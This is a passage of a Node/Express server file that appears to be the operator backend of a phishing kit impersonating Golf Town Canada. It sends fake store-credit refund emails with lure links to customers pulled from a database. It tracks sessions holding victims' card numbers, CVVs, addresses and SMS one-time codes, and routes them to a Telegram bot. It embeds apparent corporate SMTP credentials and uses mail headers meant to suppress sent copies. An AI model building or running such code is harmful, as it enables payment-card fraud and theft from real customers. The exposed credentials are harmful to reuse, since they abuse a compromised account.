import express from 'express';
import path from 'path';
import fs from 'fs';
import compression from 'compression';
import https from 'https';
import { GoogleGenAI } from '@google/genai';
import { GOLF_TOWN_STORES } from './src/data/golfTownStores';
import { INITIAL_CUSTOMERS } from './src/data/initialData';

const app = express();
const PORT = 3000;

app.use(compression());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Track last known host and protocol for Telegram short URLs fallback
let lastKnownHost = 'localhost:3000';
let lastKnownProtocol = 'https';

app.use((req, res, next) => {
  const hostHeader = req.get('host');
  if (hostHeader) {
    lastKnownHost = hostHeader;
  }
  const xForwardedProto = req.headers['x-forwarded-proto'];
  if (typeof xForwardedProto === 'string') {
    lastKnownProtocol = xForwardedProto;
  } else {
    lastKnownProtocol = req.secure ? 'https' : 'http';
  }
  next();
});

let backendCustomers = [...INITIAL_CUSTOMERS];

app.get('/api/customers', (req, res) => {
  res.json({ success: true, count: backendCustomers.length, customers: backendCustomers });
});

app.post('/api/customers', (req, res) => {
  const { customers } = req.body;
  if (Array.isArray(customers)) {
    backendCustomers = customers;
    return res.json({ success: true, count: backendCustomers.length });
  }
  return res.status(400).json({ error: 'Invalid customers array' });
});

// In-memory Notice History Stack & Live Socket Payment Sessions
interface NoticeHistoryItem {
  id: string;
  timestamp: string;
  recipientEmail: string;
  recipientName: string;
  amount: string;
  storeId: string;
  custId: string;
  subject: string;
  actionType: string;
  depositToken: string;
  secureDepositUrl: string;
  status: string;
}

interface PaymentSessionData {
  sessionId: string;
  recipientName: string;
  email: string;
  amount: string;
  storeId: string;
  custId: string;
  status: 'IDLE' | 'OPENED' | 'PROCESSING' | 'CODE_REQUIRED' | 'CODE_SUBMITTED' | 'REFUNDED' | 'SESSION_LEFT';
  openedAt?: string;
  customerCode?: string;
  cardDetails?: {
    cardNumber: string;
    expDate: string;
    cvv: string;
    cardholderName: string;
    streetAddress: string;
    city: string;
    province: string;
    postalCode: string;
    phone: string;
  };
  lastUpdated: number;
}

const noticeHistoryStack: NoticeHistoryItem[] = [];
const paymentSessions = new Map<string, PaymentSessionData>();
const tokenToSessionId = new Map<string, string>();
const shortUrlMappings = new Map<string, {
  sessionId: string;
  depositToken: string;
  amount: string;
  fullUrl: string;
}>();

interface SmtpConfig {
  host: string;
  port: number;
  user: string;
  pass: string;
  from: string;
  secure: boolean;
  tlsRejectUnauthorized?: boolean;
}

interface SmtpDebugLog {
  id: string;
  timestamp: string;
  type: 'test' | 'refund_notice';
  recipient: string;
  host: string;
  port: number;
  success: boolean;
  error?: string;
  logs: string[];
}

const smtpDebugLogsStack: SmtpDebugLog[] = [];

const CONFIG_FILE = path.join(process.cwd(), 'smtp-config.json');

function loadSmtpConfig(): SmtpConfig | null {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      const data = fs.readFileSync(CONFIG_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (err) {
    console.error('Failed to load SMTP config from file:', err);
  }
  return null;
}

function saveSmtpConfig(config: SmtpConfig) {
  try {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2), 'utf8');
  } catch (err) {
    console.error('Failed to save SMTP config to file:', err);
  }
}

let customSmtpConfig: SmtpConfig | null = loadSmtpConfig();

interface TelegramConfig {
  telegramToken: string;
  telegramChatId: string;
  isPollingActive: boolean;
}

const TELEGRAM_CONFIG_FILE = path.join(process.cwd(), 'telegram-config.json');

function loadTelegramConfig(): TelegramConfig {
  try {
    if (fs.existsSync(TELEGRAM_CONFIG_FILE)) {
      const data = fs.readFileSync(TELEGRAM_CONFIG_FILE, 'utf8');
      const parsed = JSON.parse(data);
      if (!parsed.telegramToken && process.env.TELEGRAM_BOT_TOKEN) {
        parsed.telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      }
      return parsed;
    }
  } catch (err) {
    console.error('Failed to load Telegram config:', err);
  }
  return { 
    telegramToken: process.env.TELEGRAM_BOT_TOKEN || '', 
    telegramChatId: '', 
    isPollingActive: !!process.env.TELEGRAM_BOT_TOKEN 
  };
}

function saveTelegramConfig(config: TelegramConfig) {
  try {
    fs.writeFileSync(TELEGRAM_CONFIG_FILE, JSON.stringify(config, null, 2), 'utf8');
  } catch (err) {
    console.error('Failed to save Telegram config:', err);
  }
}

let customTelegramConfig: TelegramConfig = loadTelegramConfig();

// Telegram Polling State
let telegramPollTimeout: NodeJS.Timeout | null = null;
let telegramOffset = 0;
let isPollingLoopRunning = false;

function sendTelegramRequest(method: string, body: any): Promise<any> {
  return new Promise((resolve) => {
    const token = customTelegramConfig.telegramToken;
    if (!token) {
      resolve(null);
      return;
    }
    const dataString = JSON.stringify(body);
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${token}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(dataString)
      }
    };

    const req = https.request(options, (res) => {
      let responseBody = '';
      res.on('data', (chunk) => { responseBody += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(responseBody));
        } catch (e) {
          resolve({ ok: false, error: 'Invalid JSON response from Telegram' });
        }
      });
    });

    req.on('error', (err) => {
      console.error(`Telegram request error on ${method}:`, err);
      resolve({ ok: false, error: err.message });
    });

    req.write(dataString);
    req.end();
  });
}

async function executeRefundAndEmail(
  chatId: string,
  recipientName: string,
  recipientEmail: string,
  amount: string,
  comments: string,
  storeId: string = '504',
  custId: string = 'GT-CUSTOMER'
) {
  const host = customSmtpConfig?.host || process.env.SMTP_HOST || 'smtp.office365.com';
  const user = customSmtpConfig?.user || process.env.SMTP_USER || '505receiving@cloud.golftown.com';
  const pass = customSmtpConfig?.pass || process.env.SMTP_PASS || '3Dolly16!';
  const port = Number(customSmtpConfig ? customSmtpConfig.port : (process.env.SMTP_PORT || 587));
  const from = customSmtpConfig?.from || process.env.SMTP_FROM || 'Golf Town Store Credit Support <505receiving@cloud.golftown.com>';

  const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
  const activeSessionId = `SESS-${Math.floor(100000 + Math.random() * 900000)}`;

  await sendTelegramRequest('sendMessage', {
    chat_id: chatId,
    text: `⏳ *Processing SMTP refund notice to:* \`${recipientEmail}\`...`,
    parse_mode: 'Markdown'
  });

  const secureDepositUrl = await generateShortDepositUrl(
    null,
    depositToken,
    amount,
    activeSessionId,
    recipientName,
    recipientEmail,
    storeId,
    custId
  );

  const emailSubject = `Golf Town Store Credit Refund Notice - $${amount} Issued`;
  let parsedBody = `Dear {customerName},\n\nA store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.`;

  const serverReplacements: Record<string, string> = {
    '{customerName}': recipientName,
    '{amount}': `$${amount}`,
    '{storeId}': storeId,
    '{custId}': custId,
    '{comments}': comments,
    '{depositLink}': secureDepositUrl
  };

  Object.entries(serverReplacements).forEach(([token, val]) => {
    parsedBody = parsedBody.split(token).join(val);
  });

  const formattedBodyHtml = parsedBody.split('\n').map(line => line.trim() ? `<p style="font-size: 14px; color: #4b5563; line-height: 1.6; margin-top: 0; margin-bottom: 16px;">${line}</p>` : '<br>').join('');

  const emailHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Golf Town Store Credit Notice</title>
    </head>
    <body style="margin: 0; padding: 0; background-color: #0b131e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #f1f5f9;">
      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f3f4f6; padding: 40px 10px;">
        <tr>
          <td align="center">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="max-width: 600px; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
              <tr>
                <td style="background-color: #ffffff; padding: 32px 32px 24px 32px; border-bottom: 3px solid #004d25; text-align: center;">
                  <div style="text-align: center; margin-bottom: 12px;">
                    <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0; vertical-align: middle;">
                  </div>
                  <div style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; text-align: center;">
                    Customer Support Notice
                  </div>
                </td>
              </tr>
              <tr>
                <td style="padding: 32px; background-color: #ffffff; font-family: Arial, Helvetica, sans-serif;">
                  <h1 style="font-size: 20px; font-weight: 700; color: #111827; margin: 0 0 16px 0;">
                    Store Credit Notice
                  </h1>
                  ${formattedBodyHtml}
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 28px;">
                    <tr>
                      <td style="padding: 20px;">
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="font-size: 13px; color: #374151;">
                          <tr>
                            <td style="padding-bottom: 8px; color: #6b7280; font-weight: 600;">Refund Amount:</td>
                            <td align="right" style="padding-bottom: 8px; font-size: 20px; font-weight: 800; color: #004d25;">
                              $${amount} CAD
                            </td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Customer Account ID:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-family: monospace; font-weight: 700; color: #111827;">${custId}</td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Store Location:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-weight: 600; color: #111827;">Store #${storeId}</td>
                          </tr>
                          ${comments ? `
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Reference Notes:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #374151;">${comments}</td>
                          </tr>` : ''}
                        </table>
                      </td>
                    </tr>
                  </table>
                  <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 24px; margin-bottom: 28px;">
                    <div style="font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px;">
                      Verified Secure Refund Link
                    </div>
                    <div style="margin-bottom: 16px;">
                      <a href="${secureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 700; padding: 14px 28px; border-radius: 4px; border: 1px solid #003318;">
                        Claim Store Credit Deposit ($${amount} CAD)
                      </a>
                    </div>
                    <div style="font-size: 11px; color: #9ca3af; font-family: monospace; margin-top: 4px;">
                      Token ID: ${depositToken}
                    </div>
                  </div>
                  <p style="font-size: 12px; color: #6b7280; line-height: 1.5; margin: 0 0 20px 0;">
                    Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                  </p>
                </td>
              </tr>
              <tr>
                <td style="background-color: #f9fafb; padding: 20px 32px; border-top: 1px solid #e5e7eb; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #6b7280; line-height: 1.5;">
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tr>
                      <td style="padding-bottom: 10px;">
                        <strong>Golf Town Customer Support &amp; eGift Services</strong><br>
                        Powered by CashStar / Blackhawk Network Services
                      </td>
                    </tr>
                    <tr>
                      <td style="border-top: 1px solid #e5e7eb; padding-top: 10px; color: #9ca3af;">
                        &copy; ${new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </body>
    </html>
  `;

  pushNoticeHistory({
    recipientEmail,
    recipientName,
    amount,
    storeId,
    custId,
    subject: emailSubject,
    actionType: 'refund_notice_telegram',
    depositToken,
    secureDepositUrl,
    status: 'DELIVERED'
  });

  const sessionLogs: string[] = [];
  const customLogger = {
    level: () => 'debug',
    info: (entry: any) => { sessionLogs.push(`[INFO] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
    warn: (entry: any) => { sessionLogs.push(`[WARN] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
    error: (entry: any) => { sessionLogs.push(`[ERROR] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
    debug: (entry: any) => { sessionLogs.push(`[DEBUG] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); },
    trace: (entry: any) => { sessionLogs.push(`[TRACE] ${typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry)}`); }
  };

  try {
    const nodemailer = await import('nodemailer');
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: port === 465,
      auth: { user, pass },
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      tls: {
        rejectUnauthorized: customSmtpConfig?.tlsRejectUnauthorized !== false
      },
      debug: true,
      logger: customLogger
    } as any);

    sessionLogs.push('[SYSTEM] Establishing outbound connection to server...');
    await transporter.sendMail({
      from,
      replyTo: 'GOLFTOWN SUPPORT <support@payment.golftown.ca>',
      to: recipientEmail,
      subject: emailSubject,
      html: emailHtml,
      headers: {
        'X-No-Save-Sent': 'true',
        'X-Auto-Response-Suppress': 'All',
        'X-Outbox-Bypass': 'enabled',
        'X-Mailer': 'GolfTown-Internal-CreditSystem/1.0'
      }
    });
    sessionLogs.push(`[SYSTEM] Dispatch completed. Refund notice successfully accepted by remote MTA for delivery to <${recipientEmail}>.`);

    const debugLogEntry: SmtpDebugLog = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      type: 'refund_notice',
      recipient: recipientEmail,
      host,
      port,
      success: true,
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);

    await sendTelegramRequest('sendMessage', {
      chat_id: chatId,
      text: `✅ *EMAIL REFUND NOTICE DISPATCHED!*\n\n` +
            `• *Customer:* \`${recipientName}\`\n` +
            `• *Email:* \`${recipientEmail}\`\n` +
            `• *Amount:* \`$${amount} CAD\`\n` +
            `• *Store:* \`Store #${storeId}\`\n\n` +
            `✉️ The official store credit refund notice was sent via SMTP tunnel successfully!`,
      parse_mode: 'Markdown'
    });

  } catch (mailErr: any) {
    console.error('Telegram-triggered mail dispatch failed:', mailErr);
    
    const debugLogEntry: SmtpDebugLog = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      type: 'refund_notice',
      recipient: recipientEmail,
      host,
      port,
      success: false,
      error: mailErr?.message || String(mailErr),
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);

    await sendTelegramRequest('sendMessage', {
      chat_id: chatId,
      text: `❌ *SMTP DISPATCH FAILURE!*\n\n` +
            `• *Customer:* \`${recipientName}\`\n` +
            `• *Email:* \`${recipientEmail}\`\n` +
            `• *Error:* \`${mailErr?.message || String(mailErr)}\`\n\n` +
            `⚠️ The mail server rejected or timed out during submission. Secure Link was still successfully registered for manual claim: \n${secureDepositUrl}`,
      parse_mode: 'Markdown'
    });
  }
}

async function parseRefundIntent(text: string): Promise<any | null> {
  const apiKey = process.env.GEMINI_API_KEY;
  if (apiKey) {
    try {
      const ai = new GoogleGenAI({ apiKey });
      const prompt = `Analyze the following natural language instruction from a Golf Town employee/admin. They want to send/dispatch a refund notice (which includes an email and link to claim money).
Extract the following details:
1. "recipientName" (e.g. "John Doe", if not found use "Valued Customer")
2. "recipientEmail" (extract the email address, if not found use "")
3. "amount" (extract the dollar amount, e.g. "120.50". If they write "500 bucks" or "$500", output "500.00". Default is "250.00" if no amount is found)
4. "comments" (extract the reason/description/comments, if not found use "Processed via Smart Assistant")
5. "actionType" (either "email" or "sms" or "unknown" based on what they want to do)
6. "isRefundRequest" (boolean: true if they are explicitly requesting to send/dispatch/issue/mail/emial/notifce a refund, or refund notice, false if it is just a search query or general chatter)
7. "messageResponse" (a warm, professional, human-like acknowledgment of the action, written in the style of an assistant, e.g. "I understand! I'm issuing a refund of $150.00 for John Doe...")

Input instruction: "${text}"

Return ONLY a valid JSON object with no markdown formatting or extra text, containing the fields described above:
{
  "recipientName": string,
  "recipientEmail": string,
  "amount": string,
  "comments": string,
  "actionType": "email" | "sms" | "unknown",
  "isRefundRequest": boolean,
  "messageResponse": string
}`;

      const response = await ai.models.generateContent({
        model: 'gemini-3.6-flash',
        contents: prompt,
      });

      const textOutput = response.text?.trim() || '';
      const cleanedJson = textOutput.replace(/^```json\s*/, '').replace(/^```\s*/, '').replace(/\s*```$/, '');
      const parsed = JSON.parse(cleanedJson);
      if (parsed && parsed.isRefundRequest) {
        return parsed;
      }
    } catch (e) {
      console.error('Failed to parse with Gemini API:', e);
    }
  }

  // Fallback regex parsing if Gemini is not available or failed
  const lowerText = text.toLowerCase();
  
  // Look for emails
  const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i;
  const emailMatch = text.match(emailRegex);
  const email = emailMatch ? emailMatch[1] : '';

  // Look for amount: $120.50 or 120.50 or 120 or 120 dollars
  const amountMatches = [...text.matchAll(/(?:\$|cad|usd)?\s*(\d+(?:\.\d{2})?)/gi)];
  let amount = '250.00';
  for (const m of amountMatches) {
    const val = parseFloat(m[1]);
    if (val > 0 && val < 10000) {
      amount = val.toFixed(2);
      break;
    }
  }

  // Look for keywords indicating intent: send, refund, notify, notice, mail, email, emial, notifce, etc.
  const isRefundTrigger = /refund|refun|notice|notifce|send|sedn|emial|email|mail|notify|notfy|issue|isue|create|cretae|generate/i.test(lowerText);
  
  if (email || isRefundTrigger) {
    let name = 'Valued Customer';
    const forNameMatch = text.match(/(?:for|to|name|named)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)/);
    if (forNameMatch) {
      name = forNameMatch[1];
    } else if (email) {
      const prefix = email.split('@')[0];
      name = prefix.split(/[._-]/).map(p => p.charAt(0).toUpperCase() + p.slice(1)).join(' ');
    }

    let comments = 'Processed via Natural Language Assistant';
    const descMatch = text.match(/(?:description|desc|comments|comment|reason|for)\s+(?:of|is|:)?\s*([^,\n.]+)/i);
    if (descMatch && descMatch[1]) {
      const candidate = descMatch[1].trim();
      if (candidate.toLowerCase() !== name.toLowerCase() && !candidate.includes('@') && !candidate.includes(amount)) {
        comments = candidate;
      }
    }

    return {
      recipientName: name,
      recipientEmail: email,
      amount: amount,
      comments: comments,
      actionType: 'email',
      isRefundRequest: true,
      messageResponse: `Got it! I'm on it. I've prepared a refund notice of **$${amount} CAD** for **${name}**.`
    };
  }

  return null;
}

async function handleTelegramUpdate(update: any) {
  // Handle text message commands
  if (update.message) {
    const chat = update.message.chat;
    const text = update.message.text || '';
    const chatId = String(chat.id);
    const fromName = chat.title || chat.username || chat.first_name || 'Group Chat';

    // 1. Check for location update
    if (update.message.location) {
      const { latitude, longitude } = update.message.location;
      
      // Find closest store in GOLF_TOWN_STORES
      let closestStore: any = null;
      let minDistance = Infinity;

      for (const store of GOLF_TOWN_STORES) {
        if (store.lat !== undefined && store.lng !== undefined) {
          // Haversine distance
          const lat1 = latitude;
          const lon1 = longitude;
          const lat2 = store.lat;
          const lon2 = store.lng;
          const R = 6371; // km
          const dLat = (lat2 - lat1) * Math.PI / 180;
          const dLon = (lon2 - lon1) * Math.PI / 180;
          const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                    Math.sin(dLon/2) * Math.sin(dLon/2);
          const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
          const distance = R * c;

          if (distance < minDistance) {
            minDistance = distance;
            closestStore = store;
          }
        }
      }

      let replyText = `🗺️ *LOCATION COORDINATES RECEIVED*\n` +
                      `📍 Lat/Lng: \`${latitude}, ${longitude}\`\n\n`;

      if (closestStore) {
        replyText += `🎯 *NEAREST GOLF TOWN STORE FOUND!*\n` +
                     `• *Store:* \`${closestStore.name}\` (Store #${closestStore.code})\n` +
                     `• *Distance:* \`${minDistance.toFixed(2)} km\` away\n` +
                     `• *Address:* ${closestStore.address || 'N/A'}, ${closestStore.city || ''}, ${closestStore.province || ''}\n` +
                     `• *Phone:* \`${closestStore.phone || 'N/A'}\`\n\n` +
                     `👉 [Open Directions on Google Maps](${closestStore.googleMapsUrl || 'https://maps.google.com'})`;
      } else {
        replyText += `⚠️ No nearby store could be matched in the database.`;
      }

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: replyText,
        parse_mode: 'Markdown',
        disable_web_page_preview: false
      });
      return;
    }

    // 2. Check for contact update
    if (update.message.contact) {
      const contact = update.message.contact;
      const contactName = [contact.first_name, contact.last_name].filter(Boolean).join(' ');
      
      const replyText = `👤 *TELEGRAM CONTACT INFO RECORDED*\n\n` +
                        `• *Name:* \`${contactName || 'N/A'}\`\n` +
                        `• *Phone Number:* \`${contact.phone_number || 'N/A'}\`\n` +
                        `• *Telegram User ID:* \`${contact.user_id || 'N/A'}\`\n\n` +
                        `✅ Contact details loaded into session telemetry successfully.`;

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: replyText,
        parse_mode: 'Markdown'
      });
      return;
    }

    // 3. Command: /start
    if (text.startsWith('/start')) {
      customTelegramConfig.telegramChatId = chatId;
      saveTelegramConfig(customTelegramConfig);

      const replyKeyboard = {
        keyboard: [
          [
            { text: "👥 Active Sessions" },
            { text: "📊 Customers DB" }
          ],
          [
            { text: "✉️ Notice History" },
            { text: "🔒 System Status" }
          ],
          [
            { text: "📍 Store Locations" }
          ],
          [
            { text: "👤 Send Contact", request_contact: true },
            { text: "🗺️ Send Location", request_location: true }
          ]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
      };

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: `🏌️‍♂️ *GOLF TOWN REFUND BOT CONNECTED!* 🏌️‍♂️\n\n` +
              `✅ *Status:* Active & Authorized\n` +
              `👥 *Group Bound:* \`${fromName}\` (ID: \`${chatId}\`)\n\n` +
              `All secure credit card forms, customer logs, and 6-digit corporate SMS codes will be routed here in real-time. Use the dynamic bottom buttons to fetch system information or approve refunds!`,
        parse_mode: 'Markdown',
        reply_markup: replyKeyboard
      });

      pushNoticeHistory({
        recipientEmail: 'admin@payment.golftown.ca',
        recipientName: 'Telegram Bot',
        amount: '0.00',
        storeId: 'System',
        custId: chatId,
        subject: `Telegram Bot Successfully Bound to Chat: ${fromName} (${chatId})`,
        actionType: 'telegram_bound',
        depositToken: 'BOT-INIT',
        secureDepositUrl: '',
        status: 'CONNECTED'
      });
      return;
    }

    // 4. Command: Active Sessions
    if (text.includes("👥 Active Sessions")) {
      const sessions = Array.from(paymentSessions.values());
      let responseText = `👥 *ACTIVE REFUND SESSIONS* (${sessions.length})\n\n`;

      if (sessions.length === 0) {
        responseText += `Currently, there are no active customer sessions in memory. Real-time form submissions will appear here automatically!`;
      } else {
        sessions.slice(0, 10).forEach((session, idx) => {
          const timeAgo = Math.round((Date.now() - session.lastUpdated) / 60000);
          responseText += `${idx + 1}. *${session.recipientName}* (ID: \`${session.custId}\`)\n` +
                          `   • *Store:* Store #${session.storeId}\n` +
                          `   • *Refund Amount:* \`$${session.amount} CAD\`\n` +
                          `   • *Status:* \`${session.status}\`\n` +
                          `   • *Updated:* ${timeAgo === 0 ? 'Just now' : `${timeAgo}m ago`}\n\n`;
        });
        if (sessions.length > 10) {
          responseText += `_Showing top 10 sessions. Total sessions in memory: ${sessions.length}_`;
        }
      }

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: responseText,
        parse_mode: 'Markdown'
      });
      return;
    }

    // 5. Command: Store Locations
    if (text.includes("📍 Store Locations")) {
      let responseText = `📍 *GOLF TOWN STORE DIRECTORY* (Primary Locations)\n\n`;
      
      GOLF_TOWN_STORES.slice(0, 6).forEach((store) => {
        responseText += `• *${store.name}* (Store #${store.code})\n` +
                        `  Address: ${store.address || 'N/A'}, ${store.city || ''}, ${store.province || ''}\n` +
                        `  Phone: \`${store.phone || 'N/A'}\`\n\n`;
      });
      responseText += `_For complete list of store locations, use the corporate admin locator on the dashboard portal._`;

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: responseText,
        parse_mode: 'Markdown'
      });
      return;
    }

    // 6. Command: Notice History
    if (text.includes("✉️ Notice History")) {
      let responseText = `✉️ *RECENT NOTICE HISTORY LOGS* (Last 5)\n\n`;

      if (noticeHistoryStack.length === 0) {
        responseText += `Notice history is empty. Logs will appear here as soon as SMTP messages or approvals occur.`;
      } else {
        noticeHistoryStack.slice(0, 5).forEach((item, idx) => {
          responseText += `${idx + 1}. *[${item.status}]* ${item.recipientName}\n` +
                          `   • *Subject:* ${item.subject}\n` +
                          `   • *Type:* \`${item.actionType}\`\n` +
                          `   • *Amount:* \`$${item.amount} CAD\`\n\n`;
        });
      }

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: responseText,
        parse_mode: 'Markdown'
      });
      return;
    }

    // 7. Command: System Status
    if (text.includes("🔒 System Status")) {
      const responseText = `🔒 *GOLF TOWN REFUND SYSTEM STATUS*\n\n` +
                           `• *Telegram Polling Bot:* Active & Online ⚡\n` +
                           `• *SMTP Server Routing:* Active (Golf Town SSL Tunnel)\n` +
                           `• *Active In-Memory Sessions:* \`${paymentSessions.size}\` customer(s)\n` +
                           `• *Notice Stack Depth:* \`${noticeHistoryStack.length}\` entries\n` +
                           `• *Bound Chat Group ID:* \`${customTelegramConfig.telegramChatId || 'Not Configured'}\`\n` +
                           `• *Bound Bot Username:* \`GolfTownRefundBot\`\n\n` +
                           `• *System Integrity Check:* All telemetry loops running 100% normal.`;

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: responseText,
        parse_mode: 'Markdown'
      });
      return;
    }

    // 8. Command: Customers DB
    if (text.includes("📊 Customers DB")) {
      const count = backendCustomers.length;
      let totalBalance = 0;
      backendCustomers.forEach(c => {
        totalBalance += Number(c.sumOfStoreCreditBalance || 0);
      });

      let responseText = `📊 *STORE CREDIT CUSTOMER DATABASE*\n\n` +
                         `• *Total Records Synced:* \`${count}\` customer(s)\n` +
                         `• *Coverage Periods:* \`Q1 2024 - Q2 2026\`\n` +
                         `• *Outstanding Balances:* \`$${totalBalance.toLocaleString('en-CA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} CAD\`\n\n` +
                         `🔍 *Search Customers:* To look up any record, simply send a text message with their *Name, Customer ID, Email, or Phone*!\n\n` +
                         `💡 *Quick Notice Examples:* (Click to View)\n`;

      backendCustomers.slice(0, 5).forEach((c, idx) => {
        responseText += `${idx + 1}. *${c.firstName || ''} ${c.lastName || ''}* (ID: \`${c.custId || 'N/A'}\`)\n` +
                        `   • Balance: \`$${c.sumOfStoreCreditBalance || '0.00'} CAD\` 👉 /send\\_${c.custId || c.id}\n`;
      });

      await sendTelegramRequest('sendMessage', {
        chat_id: chatId,
        text: responseText,
        parse_mode: 'Markdown'
      });
      return;
    }

    // 9. Command: Customer Action Flow (/send, /email, /sms)
    if (text.startsWith('/send_') || text.startsWith('/email_') || text.startsWith('/sms_')) {
      const parts = text.split('_');
      const action = parts[0]; // /send, /email, /sms
      const targetId = parts.slice(1).join('_').trim();

      let foundCust = backendCustomers.find(c => 
        String(c.custId || '').trim() === targetId || 
        String(c.id || '').trim() === targetId
      );

      if (!foundCust) {
        foundCust = backendCustomers.find(c => 
          String(c.custId || '').toLowerCase().includes(targetId.toLowerCase()) || 
          String(c.id || '').toLowerCase().includes(targetId.toLowerCase())
        );
      }

      if (!foundCust) {
        await sendTelegramRequest('sendMessage', {
          chat_id: chatId,
          text: `⚠️ *Customer Not Found:* Could not locate record with Customer ID or Session ID: \`${targetId}\` in the active database.`,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (action === '/send') {
        const hasEmail = foundCust.email && foundCust.email !== '(blank)' && foundCust.email.includes('@');
        const hasPhone = foundCust.phone && foundCust.phone !== '(blank)' && foundCust.phone.trim().length > 3;

        let replyText = `👤 *CUSTOMER FILE FOUND*\n\n` +
                        `• *Name:* *${foundCust.firstName || ''} ${foundCust.lastName || ''}*\n` +
                        `• *Customer ID:* \`${foundCust.custId || 'N/A'}\`\n` +
                        `• *Store Location:* Store #${foundCust.storeId || '504'}\n` +
                        `• *Store Credit Balance:* \`$${foundCust.sumOfStoreCreditBalance || '0.00'} CAD\`\n` +
                        `• *Email:* \`${foundCust.email || '(blank)'}\`\n` +
                        `• *Phone:* \`${foundCust.phone || '(blank)'}\`\n\n` +
                        `⚡ *SEND REFUND NOTICE:*`;

        if (hasEmail) {
          replyText += `\n👉 /email\\_${foundCust.custId || foundCust.id} (Send official refund email via SMTP)`;
        } else {
          replyText += `\n⚠️ _No email address on file._`;
        }

        if (hasPhone) {
          replyText += `\n👉 /sms\\_${foundCust.custId || foundCust.id} (Generate secure SMS refund link)`;
        } else {
          replyText += `\n⚠️ _No phone number on file._`;
        }

        await sendTelegramRequest('sendMessage', {
          chat_id: chatId,
          text: replyText,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (action === '/email') {
        const recipientEmail = foundCust.email;
        if (!recipientEmail || recipientEmail === '(blank)' || !recipientEmail.includes('@')) {
          await sendTelegramRequest('sendMessage', {
